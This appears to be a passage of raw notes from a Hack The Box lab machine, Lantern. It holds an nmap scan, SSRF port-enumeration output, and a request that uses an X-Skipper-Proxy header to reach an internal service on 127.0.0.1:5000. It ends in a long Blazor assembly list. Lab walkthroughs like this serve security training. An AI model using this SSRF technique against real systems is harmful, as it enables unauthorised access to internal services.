```bash
┌─[aexon@parrot]─[~]
└──╼ $nmap -sCV -p- 10.10.11.29 --min-rate 1000 -Pn 
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-24 08:53 WIB
Warning: 10.10.11.29 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.29
Host is up (0.056s latency).
Not shown: 65148 closed tcp ports (conn-refused), 384 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:c9:47:d5:89:f8:50:83:02:5e:fe:53:30:ac:2d:0e (ECDSA)
|_  256 d4:22:cf:fe:b1:00:cb:eb:6d:dc:b2:b4:64:6b:9d:89 (ED25519)
80/tcp   open  http    Golang net/http server
|_http-title: Did not follow redirect to http://lantern.htb/
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Length: 207
|     Content-Type: text/html; charset=utf-8
|     Date: Sat, 24 Aug 2024 01:43:52 GMT
|     Server: Skipper Proxy
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GenericLines, Help, LPDString, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Length: 225
|     Content-Type: text/html; charset=utf-8
|     Date: Sat, 24 Aug 2024 01:43:50 GMT
|     Location: http://lantern.htb/
|     Server: Skipper Proxy
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://lantern.htb/">http://lantern.htb/</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Sat, 24 Aug 2024 01:43:51 GMT
|_    Server: Skipper Proxy
|_http-server-header: Skipper Proxy
3000/tcp open  http    Microsoft Kestrel httpd
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Kestrel
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.95%I=7%D=8/24%Time=66C93D9B%P=x86_64-unknown-linux-gnu%r
SF:(GetRequest,18F,"HTTP/1\.0\x20302\x20Found\r\nContent-Length:\x20225\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Sat,\x2024\x2
SF:0Aug\x202024\x2001:43:50\x20GMT\r\nLocation:\x20http://lantern\.htb/\r\
SF:nServer:\x20Skipper\x20Proxy\r\n\r\n<!doctype\x20html>\n<html\x20lang=e
SF:n>\n<title>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>Yo
SF:u\x20should\x20be\x20redirected\x20automatically\x20to\x20the\x20target
SF:\x20URL:\x20<a\x20href=\"http://lantern\.htb/\">http://lantern\.htb/</a
SF:>\.\x20If\x20not,\x20click\x20the\x20link\.\n")%r(HTTPOptions,A5,"HTTP/
SF:1\.0\x20200\x20OK\r\nAllow:\x20HEAD,\x20OPTIONS,\x20GET\r\nContent-Leng
SF:th:\x200\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Sa
SF:t,\x2024\x20Aug\x202024\x2001:43:51\x20GMT\r\nServer:\x20Skipper\x20Pro
SF:xy\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,162,"HTTP/1\.0\x20404\x
SF:20Not\x20Found\r\nContent-Length:\x20207\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nDate:\x20Sat,\x2024\x20Aug\x202024\x2001:43:52\x20
SF:GMT\r\nServer:\x20Skipper\x20Proxy\r\n\r\n<!doctype\x20html>\n<html\x20
SF:lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<p
SF:>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\
SF:.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\
SF:x20your\x20spelling\x20and\x20try\x20again\.</p>\n")%r(GenericLines,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 151.38 seconds

```


PORT OPEN, skipper header

```bash
(scan_port) ┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/linux/Lantern/scan_port]
└──╼ $python3 scan_port.py 
[+] Enumerate ports for local network via SSRF: Finish!
Port 21 Internal Server Error - Response: 503
Port 22 Internal Server Error - Response: 500
Port 23 Internal Server Error - Response: 503
Port 25 Internal Server Error - Response: 503
Port 53 Internal Server Error - Response: 503
Port 80 is open - Response: 200
Port 110 Internal Server Error - Response: 503
Port 143 Internal Server Error - Response: 503
Port 443 Internal Server Error - Response: 503
Port 465 Internal Server Error - Response: 503
Port 587 Internal Server Error - Response: 503
Port 993 Internal Server Error - Response: 503
Port 995 Internal Server Error - Response: 503
Port 3306 Internal Server Error - Response: 503
Port 3389 Internal Server Error - Response: 503
Port 8080 Internal Server Error - Response: 503
Port 8443 Internal Server Error - Response: 503
Port 5000 is open - Response: 200
Port 8000 is open - Response: 200
```

check internal

```json
GET /_framework/blazor.boot.json HTTP/1.1
Host: lantern.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
X-Skipper-Proxy: http://127.0.0.1:5000

```

response

```json
HTTP/1.1 200 OK
Accept-Ranges: bytes
Blazor-Environment: Production
Cache-Control: no-cache
Content-Length: 20709
Content-Type: application/json
Date: Sat, 24 Aug 2024 02:56:48 GMT
Etag: "1daf595e74739e5"
Last-Modified: Fri, 23 Aug 2024 19:51:54 GMT
Server: Skipper Proxy
Connection: close

{
  "cacheBootResources": true,
  "config": [ ],
  "debugBuild": true,
  "entryAssembly": "InternaLantern",
  "icuDataMode": 0,
  "linkerEnabled": false,
  "resources": {
    "assembly": {
      "Microsoft.AspNetCore.Authorization.dll": "sha256-hGbT4jDhpi63093bjGt+4XVJ3Z9t1FVbmgNmYYmpiNY=",
      "Microsoft.AspNetCore.Components.dll": "sha256-NJ2GmZOAzlolS7ZPvt5guh86ICBupqwCNK0ygg7fkhE=",
      "Microsoft.AspNetCore.Components.Forms.dll": "sha256-YEcUfJbV\/+SrxppUEKn5jqOg8WptBrdAGaDG+psN8Yg=",
      "Microsoft.AspNetCore.Components.Web.dll": "sha256-aq+IFhf0HZZKVz6P\/GhuaY0UvXsguM0h5hlYrzAfugk=",
      "Microsoft.AspNetCore.Components.WebAssembly.dll": "sha256-zARafz0vNUQ9qVFCoQO3oQSP+VMitM2+PZs+2OkxMgE=",
      "Microsoft.AspNetCore.Metadata.dll": "sha256-hXAd66KKDdPFPpv7aqk5iax9UhTcBUufrs8eHMuWft8=",
      "Microsoft.Data.Sqlite.dll": "sha256-P7LhObgh2GnsYLLiMfziXrBpg9kGBWyCbsYGkwtejF8=",
      "Microsoft.EntityFrameworkCore.dll": "sha256-\/0vzNZ5eWblA2X+fR1UnJhUxV8M4YE+hmYHhDjTGLRo=",
      "Microsoft.EntityFrameworkCore.Abstractions.dll": "sha256-8WueLfL+Qxf6IHdLNiHRte4+9uKx0fzs0SwZLo+vyE0=",
      "Microsoft.EntityFrameworkCore.Relational.dll": "sha256-mZQU3N+UuoJQXtwxG9xddHMJcWK3bjbR8vYUtaD+qhw=",
      "Microsoft.EntityFrameworkCore.Sqlite.dll": "sha256-3OAZnYHlX6IWO0525\/6Hb9dldwpLRrDYpJyOgrOfM3g=",
      "Microsoft.Extensions.Caching.Abstractions.dll": "sha256-WLcZIKlgct2nj4hpaBvZXfHorQG9DH9B\/FZ2IKePG2I=",
      "Microsoft.Extensions.Caching.Memory.dll": "sha256-+\/xwpO8U5NMbRcqzMIKrIuvK9dnm3EX9S2C6diMDLmQ=",
      "Microsoft.Extensions.Configuration.dll": "sha256-c8yYhfrOBLEnOBglLTu9peXSbJDwFpuT4UQiXSv28Og=",
      "Microsoft.Extensions.Configuration.Abstractions.dll": "sha256-5Otet+KKVUjNkE\/hqcNWmt75H1K2VNuKPFagpRd6Ces=",
      "Microsoft.Extensions.Configuration.Binder.dll": "sha256-wNKhG3Ovx8jqxbscz2AALlsTLfI6GL2dyDhe63mSsoM=",
      "Microsoft.Extensions.Configuration.FileExtensions.dll": "sha256-n2fRP2\/1tGNzaCF5PU4hgTSlHK886OviBf2YAds3NdE=",
      "Microsoft.Extensions.Configuration.Json.dll": "sha256-R28\/ywLWxIcFxKtDIj0IxC+bXi4urX6BHeLL24R+vTQ=",
      "Microsoft.Extensions.DependencyInjection.dll": "sha256-KqgYK1NWqMxcNfw2Qah+gUhX2Nm+OZrHjyYDQ3VNCeA=",
      "Microsoft.Extensions.DependencyInjection.Abstractions.dll": "sha256-nM2DA1GqKLxoPU+NHO\/Z5yQWH5ctJb+2Tu5b9VxIxeM=",
      "Microsoft.Extensions.DependencyModel.dll": "sha256-tkBiVGV6aPhN9weYepMZ2vvS6Ggf0uOE88fuWINRAHg=",
      "Microsoft.Extensions.FileProviders.Abstractions.dll": "sha256-7PzvEcQvpK1c8tTX9VPI8AF+XrekqbAytNBQXJjvTvQ=",
      "Microsoft.Extensions.FileProviders.Physical.dll": "sha256-sXujvGMZDgBBZ9HqfcEq9XsM0pvwyhPt60NA9qLDzGI=",
      "Microsoft.Extensions.FileSystemGlobbing.dll": "sha256-viiXOG0fwhWobT0TQ1ZOJiZBdRvYRlWbDtjz+6d8sQI=",
      "Microsoft.Extensions.Logging.dll": "sha256-GDZQCBtVHfrZZ6fL95lGoinLeUWLjQShLbfESwO7mrc=",
      "Microsoft.Extensions.Logging.Abstractions.dll": "sha256-1XXJ0VQ8pybOFNvf\/RA+k+pSfNRrsoMW2h9BItvFXVY=",
      "Microsoft.Extensions.Options.dll": "sha256-eGESyy9mRu8RcCGajAu4E8nxSmeB5nxiZkFPVaZ5Vl0=",
      "Microsoft.Extensions.Primitives.dll": "sha256-jOmoWSfsdQexH\/6QCA56gR1RMEqeix2iDDUBWbpAOQI=",
      "Microsoft.JSInterop.dll": "sha256-U4TlhQzx2DEFb2LgmELxAvWalkXk5Dx\/HsVDyQH8ubA=",
      "Microsoft.JSInterop.WebAssembly.dll": "sha256-11MM537VpREUoEMIiXr2jsO5eqHCkixj9Zi1I4hLPOw=",
      "Radzen.Blazor.dll": "sha256-O3yDs1MlWqWu2hreREiTQAVCo6UPcAhx\/1zwHAbq9AU=",
      "SQLitePCLRaw.batteries_v2.dll": "sha256-3zKmFZbXOvqy\/nbxPUg5JZvDTOvq9arYLUdbvEcjJaU=",
      "SQLitePCLRaw.core.dll": "sha256-PNJw8RYgf8D34p1OhHDWQniuocI62TExP3HpyqrrhCc=",
      "SQLitePCLRaw.provider.e_sqlite3.dll": "sha256-HbBW2\/rK7rujCfVp110bCv\/xKe+LGGRcIbcF73Mq7uM=",
      "System.IO.Pipelines.dll": "sha256-fpnawcAWgJ8i0JPJ9DhQ8XFDKYsTi6md2eRFNh\/bONA=",
      "System.Linq.Dynamic.Core.dll": "sha256-FdGinC2F9gJYE7tbVl93B0jYWTB+CCpGiFHbABqlHFE=",
      "Microsoft.CSharp.dll": "sha256-ql0JuqQqMvWlkrz+ktRnb+sgR+RBuabSpT82YicO+Dc=",
      "Microsoft.VisualBasic.Core.dll": "sha256-yjDGnYBu6yp61MAe+i7sbIj\/AgPhLbBm5dleSxMPjDo=",
      "Microsoft.VisualBasic.dll": "sha256-m6TH5rs0haOMSWvUpe3f7naMYyalexbVkIbVq1amiUw=",
      "Microsoft.Win32.Primitives.dll": "sha256-876FS9JtlcgkjOdpbs3USC8yRAhx1J17Oe06Sxvgv1s=",
      "Microsoft.Win32.Registry.dll": "sha256-XobufPKAyEWhlHb3h0C1DBkY0W+tuI2nHHzJSlv6sd4=",
      "System.AppContext.dll": "sha256-hBsiGfTO8GaNHCdJ56FXzm0RGbXphFD5i7XcgumQ5eE=",
      "System.Buffers.dll": "sha256-cIBVQrX2W2b5N8+mTMqkZWml\/dk2IYx7pMUf0\/Ht5W4=",
      "System.Collections.Concurrent.dll": "sha256-siI159VpD2kJEZKPQt190M1ILHAQ8zZmlExN8ABLOpw=",
      "System.Collections.Immutable.dll": "sha256-RnZJ2YASocT2oB\/iuNE8vQvy6NfhULpfdVIbtKIHCDI=",
      "System.Collections.NonGeneric.dll": "sha256-dK0uprIk58Zq\/0ds9ff4NdXE+eGgwXEPt1+zHdwEDEQ=",
      "System.Collections.Specialized.dll": "sha256-PpNg+QA9B70KCxPBqJYreFMpDplPOZEczvjo\/G+vdU4=",
      "System.Collections.dll": "sha256-7+zDvydzBWfAOV3bOqXSCD7GqskEAIQ3RzZ0IXiQsAs=",
      "System.ComponentModel.Annotations.dll": "sha256-gJZuo7oH44JEm+ABiI\/0SCYvW4btsifc6SQ93rolPtQ=",
      "System.ComponentModel.DataAnnotations.dll": "sha256-c9XX2VfWJO2vQwja\/S9IMq4IaEVNIFBSdo1yN00ipTM=",
      "System.ComponentModel.EventBasedAsync.dll": "sha256-a6Zv5CE2XCHSH6P5one9x+s9AETxFBsps9r9xjbyytk=",
      "System.ComponentModel.Primitives.dll": "sha256-Ldn4aoxvjOLgvQ9Onwicuzrx2fFIu3Rz0Dv2MdNsLtw=",
      "System.ComponentModel.TypeConverter.dll": "sha256-Z22usUOyo6Y+llp9jVHm8X+MiU41IkuvJTkuJMNOmx4=",
      "System.ComponentModel.dll": "sha256-4mdLIiD68reMpts\/jwSZNSDriaxeKwnQN\/bbRp3ymjc=",
      "System.Configuration.dll": "sha256-ndWVZOsXDGoCB+GrsvduXcLDyAcFi+H7G\/MeMcGAmkQ=",
      "System.Console.dll": "sha256-sfSjogW2UHhB1\/Nh5SNyZLbc\/Qx1Sd\/t59EZEIiAGsE=",
      "System.Core.dll": "sha256-UIvt8dePz7PcAULl7yQlO0Re3Q\/06HNI8nxsH1MNLFk=",
      "System.Data.Common.dll": "sha256-QHHyRzOPsWFYvrU4Z2hnJmZmzhgirRscl7n7L3BiTfE=",
      "System.Data.DataSetExtensions.dll": "sha256-jBgz7GiFLxY3uae0rmhsnCrhFw3nWh37zS8xK6XXCLw=",
      "System.Data.dll": "sha256-uprvV1ostYH0WGtP0peiUMFKZgWyj1F3RsCA0+Pjwno=",
      "System.Diagnostics.Contracts.dll": "sha256-04HscpY2KVy3rAYunUTynLbO1QdOrQEy2IWRaxtUD1E=",
      "System.Diagnostics.Debug.dll": "sha256-dJ0BRGYTZEKX2lvaiF3DwOs+3NoksKxBc\/\/JkhS3el4=",
      "System.Diagnostics.DiagnosticSource.dll": "sha256-6Bda\/qXnVWWS\/+W6zwzK5ahNXI+IXHSat2Y482ykUXY=",
      "System.Diagnostics.FileVersionInfo.dll": "sha256-VgF91zwEvvHl9WyGF\/9\/EcW5f5hoV4nXji82rrTgODs=",
      "System.Diagnostics.Process.dll": "sha256-LAcV0KCZ+lbQJx5wxbOfg+XHNwtiv0KjE5b2NlXxj4A=",
      "System.Diagnostics.StackTrace.dll": "sha256-4aulZf3KsEhHbaCOEWI1MzSQKYXwVCXgXbuKWPARBMI=",
      "System.Diagnostics.TextWriterTraceListener.dll": "sha256-hOv0U7h8qObsuPJEx\/m8mLcv99r5\/MdONagOQMG3h3g=",
      "System.Diagnostics.Tools.dll": "sha256-yFuBkKVLF5YkUzXiUJdN9Aax1ip9qdKa4g4vHSM7Pg4=",
      "System.Diagnostics.TraceSource.dll": "sha256-zSVMA9jpwFQ+HUCn5AgptC59Rqy2QluMrw5iq1Awr+o=",
      "System.Diagnostics.Tracing.dll": "sha256-Znt2F2MvUczDKdqHSlxjNU1l9XUqzA+olkHYI\/\/HEZc=",
      "System.Drawing.Primitives.dll": "sha256-u6Ds7SMMOdGgX52t00SUjNCXTD1imy8s7QBj2qlIam8=",
      "System.Drawing.dll": "sha256-HgN64SBiB8Ajrh25n\/DjpxcW6qQuzrtxZ4Om+nR2dd4=",
      "System.Dynamic.Runtime.dll": "sha256-E+Uyxsihob6Ysg2e6tonQQQzKQKAr0M2AINEgeY72Uc=",
      "System.Formats.Asn1.dll": "sha256-ttncKNMxBNIMM26nmx0L1TTCxr\/r0rEIldSh7vWwHYw=",
      "System.Globalization.Calendars.dll": "sha256-GPVcdDqvBvLxmW0dy4KAChwohexPWXuuSKljnSJyYEI=",
      "System.Globalization.Extensions.dll": "sha256-bv7qPH+2WGAyoWOFFn31s26eTEvdwWF9B3JY7Ooueqs=",
      "System.Globalization.dll": "sha256-+WfptQvKMZV5hzhEIAfPGh4++aNn+SBTCs\/iI1WR8Dk=",
      "System.IO.Compression.Brotli.dll": "sha256-bGxNHKkn7llJau+sGbQ2G3ASBqnpv337+kRmN63ftLI=",
      "System.IO.Compression.FileSystem.dll": "sha256-ahuONSqKzbUeueVBOowVQ6tHUijcV3h4LII\/dCWTY+w=",
      "System.IO.Compression.ZipFile.dll": "sha256-dRbKoalR17SAvWAkQj7jLreA6QRJ1LIuXd2au5Xekzw=",
      "System.IO.Compression.dll": "sha256-wG4o2\/MIZgfUDo1Vet1Gip0SORGlHfGp2Yp6Dxo6Vt0=",
      "System.IO.FileSystem.AccessControl.dll": "sha256-eYdrk8dJz\/wUrufjP\/UNggdTFNwk4O3YwbpHTdUDsX8=",
      "System.IO.FileSystem.DriveInfo.dll": "sha256-VsDACniP8x714h33W\/zlQSqoMDUEuI2PhdjL0e2iCOc=",
      "System.IO.FileSystem.Primitives.dll": "sha256-YR5Y9FjJgCSd2ICb5R+kQ1OULbHknX\/rT5DcuBfEKN0=",
      "System.IO.FileSystem.Watcher.dll": "sha256-DofMA10KA6kXgqHGF0T+tkZs23dvaX8tOubRco6EE0c=",
      "System.IO.FileSystem.dll": "sha256-AQmejCKaDpWSbijkXOHGKGPx7omcSePn0xhYEa+9\/nU=",
      "System.IO.IsolatedStorage.dll": "sha256-KI5UJjVeANP6d5Ya0iiG5ezOqCZDyL5FngTHdOu08SA=",
      "System.IO.MemoryMappedFiles.dll": "sha256-bdImZQ\/CjWze5n5Q0qW+HdYxUfg0shaUKvIGaS7M4ts=",
      "System.IO.Pipes.AccessControl.dll": "sha256-UPKPCzZwwaiE6bk32YvgCJjF5d3d8ORAGBzFYOAebsY=",
      "System.IO.Pipes.dll": "sha256-s4RGtH\/jENkZfbXgVQRYW2M6c+x+lKPS2NQV\/I8F5Vo=",
      "System.IO.UnmanagedMemoryStream.dll": "sha256-d9XMexSCGwm51FC26V1ruNMrkcaWMnaRlHZ0RlWpgk4=",
      "System.IO.dll": "sha256-tPl5IEqEL9rZ0AA1lNyWr+NpSAsJXq18FGJ+yT59Axw=",
      "System.Linq.Expressions.dll": "sha256-JHWBpvo7vIZoyC6nJKrsySWYISCX4rcC1vrooBjOeiw=",
      "System.Linq.Parallel.dll": "sha256-pNJ8lVItDNo+fLK\/fk18QB4pRLmqbT0Ynrq3O563b3E=",
      "System.Linq.Queryable.dll": "sha256-g1mOwcDyw7rBZgQx5SY0lsX8ZzXxDwTdOD3lbZjXx9g=",
      "System.Linq.dll": "sha256-kKiuT3My5hXJTds+8wSpfhnkQ3EuNwAQOxLGXVWoo\/M=",
      "System.Memory.dll": "sha256-WkC8Wsmx3jhJzOozIVey19+2WCRKagDXqQ2wPoTmqMQ=",
      "System.Net.Http.Json.dll": "sha256-yxJsoo7mpPgba40f9MtcAVBP51xO6MdTAXUl6snT4h4=",
      "System.Net.Http.dll": "sha256-r3K4KxolDW28DS3TVL\/TGXhligLQC6Z3HjHkmDmIfas=",
      "System.Net.HttpListener.dll": "sha256-v4pad4WjG60vdOD6uLny6O81hhrBVd48y9rDdN8Dq\/o=",
      "System.Net.Mail.dll": "sha256-2mwF5+qoPkx3XIiJi2OYUzem+cWt3VF9+KaNf8Hsye0=",
      "System.Net.NameResolution.dll": "sha256-M1ZJefldkQZKromnEt+NOuyj\/yZoRNZA4ylC65eHm6g=",
      "System.Net.NetworkInformation.dll": "sha256-wsMHsDbz4d5DydbVLVrBTCbD\/9iiZ7nnySLsoe9lZOA=",
      "System.Net.Ping.dll": "sha256-OgyabYmjg\/QoikHVhC21oZ+j+l1qh8KY4q3r\/M2NnTI=",
      "System.Net.Primitives.dll": "sha256-NG4UfhaU5YjgXEGUyUp4iQz9iZVaq4bDWEKYS25AYag=",
      "System.Net.Quic.dll": "sha256-EBUis8AXuMo+\/ClBGBEBRQSBsN2VZVCUW2lK8KgqHDc=",
      "System.Net.Requests.dll": "sha256-D28ojQn2wULGH3UY3KCQq\/W2tQOTXdEjf4o5QzrxjpA=",
      "System.Net.Security.dll": "sha256-rtOi8JvsuVI2UHUu3K2aTXHfW\/HaUT8hfWmOCHqJfD8=",
      "System.Net.ServicePoint.dll": "sha256-xC8LyLf2wKJv9NbYGxIBF0U278DK+R9EC+TiVQB3kEw=",
      "System.Net.Sockets.dll": "sha256-KnJrJeKN7C63waH5UwAkTrInYNHGZn9QuVFCbLg4wMk=",
      "System.Net.WebClient.dll": "sha256-ujyYKldEAwk4tEavtIDnDLqiqbzF2QjVmAzqx8MsQng=",
      "System.Net.WebHeaderCollection.dll": "sha256-vnRspNkJub8sXtoWeZs8+oq+1FsquxH756RKGxjOku8=",
      "System.Net.WebProxy.dll": "sha256-bIe3ECnqNiPcRaLQowGHm3WTfeCrHrs9HmTmHrrl9vI=",
      "System.Net.WebSockets.Client.dll": "sha256-xkeIwJxbwgJVlEbFDEygTnyJy+fX4zml2\/9\/MSkf8gE=",
      "System.Net.WebSockets.dll": "sha256-j7qKM1czN5Vc8ZqXLXPbxo4ddYPM6dXSUTShZb1rtkI=",
      "System.Net.dll": "sha256-G8nfef3F7xib4OgZq9SblT3qQIliMyySyx4evJzSqEE=",
      "System.Numerics.Vectors.dll": "sha256-hbOCd5D16UtHUaw9nqW8e+4GschlwoU4GEyTgTYt\/Jo=",
      "System.Numerics.dll": "sha256-C9vZH9HxWKaSHK6pme42QeTgu37MzEGBSlHeQtzixEA=",
      "System.ObjectModel.dll": "sha256-pm3\/qRJNMeOtJciRC71QcNZz+0T3D97YnGyOnasBho4=",
      "System.Private.DataContractSerialization.dll": "sha256-QbUE5Dd94wLrv6MhfNewyz+lNv7VIFWVofS7ohYdrXU=",
      "System.Private.Runtime.InteropServices.JavaScript.dll": "sha256-\/8PF7xlkMgqCzSnp4roSH8ICGHPrzz4\/1C0DIichYpI=",
      "System.Private.Uri.dll": "sha256-X62lyZatIoKTJY\/Rt31LgU\/\/NX88W86O6pfWh6XS41c=",
      "System.Private.Xml.Linq.dll": "sha256-UqktLl8RdHKrJ38qqF6XlvPOvi3xgY6ZVEeuOa4u6w8=",
      "System.Private.Xml.dll": "sha256-feqoL93GgPoHmad5UF2r0yg4RTbJhYsXQcimiawJv6U=",
      "System.Reflection.DispatchProxy.dll": "sha256-zlWNpwEJQEcx7Mf1xOg\/Sd5hIn1YGK+LBeiAhjKYabs=",
      "System.Reflection.Emit.ILGeneration.dll": "sha256-Wwzmn9ixLOdT9Q4S3lsGbvU6RgX88PrdJapC2weJQ50=",
      "System.Reflection.Emit.Lightweight.dll": "sha256-StIky\/cqvRUJnMZgDJ3S8zDgKeyiOXPBGul1qmY3zQo=",
      "System.Reflection.Emit.dll": "sha256-8+wJTovqZaO43nyKvBpajlYed1fklPXupH24vEe1rcE=",
      "System.Reflection.Extensions.dll": "sha256-14fnFJC0FAATTHPiVrQwvmLmm2qi8Ni18HvYZNZX0rs=",
      "System.Reflection.Metadata.dll": "sha256-ighwuSyDVJI1oYrAoHA3PMc5uEh3LRZQ1D1+nJnzXF4=",
      "System.Reflection.Primitives.dll": "sha256-YQBeKPHUbX9vi3HtoUXyks9WPlb2pyV8rtrQK\/6ycCU=",
      "System.Reflection.TypeExtensions.dll": "sha256-qvnV8ZTIWtntKKNR7pZ+KwpfPO1EpWD4yh8jTkYKYRo=",
      "System.Reflection.dll": "sha256-u7GYvozPApwvzjBc31GuZMeH6vtzPd9PToVE73OANPg=",
      "System.Resources.Reader.dll": "sha256-c6FJmtQRb\/VHa2HJ26jk10tgkc4EPI2zAzh3K5asxbU=",
      "System.Resources.ResourceManager.dll": "sha256-f4HxrKxMgkTr4MzgdDVq1xRj0nMZ4DX85ZclMulX4vQ=",
      "System.Resources.Writer.dll": "sha256-dTHiLV8bUkk1UG8EMyt6DGqR0l2qPUOC9q6q0cyznYY=",
      "System.Runtime.CompilerServices.Unsafe.dll": "sha256-k3HWAm8hCD5yrBJ0UPew1ORMmeGyy74ZErf6+X9ETJc=",
      "System.Runtime.CompilerServices.VisualC.dll": "sha256-WXOm0n0aBJE1\/2QHYsnQLD0su942NQ7odPc+YNxdab0=",
      "System.Runtime.Extensions.dll": "sha256-rzt5RwKG9PduPh47i6I1uq43MXbSEQQ5qC4IanNwgg8=",
      "System.Runtime.Handles.dll": "sha256-wJflcv43fAzX3kczlUUcZaLqy6xebfNpO7YWrUdlN6M=",
      "System.Runtime.InteropServices.RuntimeInformation.dll": "sha256-TXdeaQuMYwYsZekQZ94n3P\/4WBM9geAoxMU1GMUOFh8=",
      "System.Runtime.InteropServices.dll": "sha256-FhSvdPrUwd2cSpIG5LueEynIbkhqsDJfuhUkjTqV7HI=",
      "System.Runtime.Intrinsics.dll": "sha256-SbogkH6qeJsWsV7iPIlfWmG+OtFRsWr6PGmtmYel3ss=",
      "System.Runtime.Loader.dll": "sha256-04rg75EwwT+qlxSxKNgA\/it8MbVGDr0Xmo30v\/XtW4Q=",
      "System.Runtime.Numerics.dll": "sha256-9Lyq9ORGeQFNnJWFUIMzcCVONRm33mMZbcHQ+7kYkqw=",
      "System.Runtime.Serialization.Formatters.dll": "sha256-g4\/A5rwaNm8ntiwoA5n2bhpO1XoMBRWDba1wquClO8I=",
      "System.Runtime.Serialization.Json.dll": "sha256-WAS9zuFqSGp55zoZVEWUVl+JRk5RN6wVKXkSziM3OOw=",
      "System.Runtime.Serialization.Primitives.dll": "sha256-DdvnEF4CSXMqkj0quXgPLlWeBhOEwIK8tEM3Nj132aM=",
      "System.Runtime.Serialization.Xml.dll": "sha256-CAGIKrs6UDzetxsW5agYluy6Ku1Ea0UFOeNkswJtqh8=",
      "System.Runtime.Serialization.dll": "sha256-OLkN7ThXD3qZPadaVb\/V+Sd6HsIbYXDIEKJVCfOZ5V4=",
      "System.Runtime.dll": "sha256-u+p1S6CWZDwJPi5yNoSZRRiispI7HwTKRxrdHErPkE8=",
      "System.Security.AccessControl.dll": "sha256-2KdkUTv\/4QPdccH96o1athaPwNRlEFqAG1D1zC55Ywg=",
      "System.Security.Claims.dll": "sha256-kgo+HeoL9k2ntqYDslCFA5WhBDMEjo3RKAs04ig\/2iE=",
      "System.Security.Cryptography.Algorithms.dll": "sha256-A3pi8LOTmfQIFFXXJc\/V2uOa2EvA2IOpwGDwwf8Xu9A=",
      "System.Security.Cryptography.Cng.dll": "sha256-BTtw7nptKY75SZqEGpzteOkSJ1riOa+ynW4t8iELp1c=",
      "System.Security.Cryptography.Csp.dll": "sha256-jgxjePXbj7T\/imxqEuM7yxndarlPmO1Mhzx1KSsbE\/o=",
      "System.Security.Cryptography.Encoding.dll": "sha256-Yu9rAfznTa+e51IdWkbpGniy\/7zr\/81SlaKE6xeAbAE=",
      "System.Security.Cryptography.OpenSsl.dll": "sha256-doNcZf7tQQexD78KDZYAbF3BIpj0zDkvBiKeSInZ\/PI=",
      "System.Security.Cryptography.Primitives.dll": "sha256-KuFuBLIlVhgZc9rkRbtJ4byWpfROhUNUjB6nBYab7DY=",
      "System.Security.Cryptography.X509Certificates.dll": "sha256-4OwV7OWq8+y1raWVDGXWTHGjq\/Q6LFqFMn5MoMqNCW4=",
      "System.Security.Principal.Windows.dll": "sha256-QR3r1ek64aGNBXWL5DLmj0t3NBMBskYDhwGDCrLQ\/o0=",
      "System.Security.Principal.dll": "sha256-AvspaIoT5XoryB02FU3R2VE+BbTUzIjY1TQtk+Igx1o=",
      "System.Security.SecureString.dll": "sha256-dPPmyPEcJ6\/7BDnE22U04KLqZz9ylEGz3YcVGBoeAhU=",
